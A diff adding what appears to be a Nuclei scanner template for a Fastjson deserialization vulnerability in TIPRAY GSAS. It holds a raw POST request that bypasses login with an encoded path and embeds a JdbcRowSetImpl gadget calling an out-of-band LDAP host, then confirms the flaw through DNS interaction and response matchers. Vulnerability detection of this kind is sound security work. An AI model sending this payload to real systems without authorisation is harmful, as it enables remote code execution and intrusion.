@@ -1,0 +1,54 @@
+id: tipray-gsas-mergequery-fastjson-deserialization
+info:
+  name: TIPRAY GSAS mergeQuery Fastjson Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: deserialization,dnslog
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /trwfe/login.jsp/.%2e/rest/ext/mergeQuery HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        [
+            {
+                "requestType": "trusteeMsg",
+                "requestBody": {
+                    "userId": {
+                        "@type": "com.sun.rowset.JdbcRowSetImpl",
+                        "dataSourceName": "ldap://{{reverse}}/{{rand_base(6)}}",
+                        "autoCommit": true
+                    },
+                    "createTime": "2023-01-01"
+                }
+            }
+        ]
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "Bad request"
+          - "查询委托消息请求体格式错误"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
